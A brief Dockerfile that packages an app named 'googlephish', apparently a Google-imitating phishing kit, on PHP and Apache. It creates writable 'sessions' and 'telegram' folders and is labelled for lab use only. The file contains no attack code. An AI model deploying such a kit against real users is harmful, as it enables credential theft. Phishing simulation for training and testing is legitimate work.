# PHP + Apache for the googlephish app (lab / local use only).
FROM php:8.2-apache-bookworm

RUN a2enmod rewrite headers \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /var/www/html

COPY . /var/www/html/

RUN mkdir -p /var/www/html/sessions /var/www/html/telegram \
    && chown -R www-data:www-data /var/www/html/sessions /var/www/html/telegram \
    && chmod 775 /var/www/html/sessions /var/www/html/telegram

EXPOSE 80
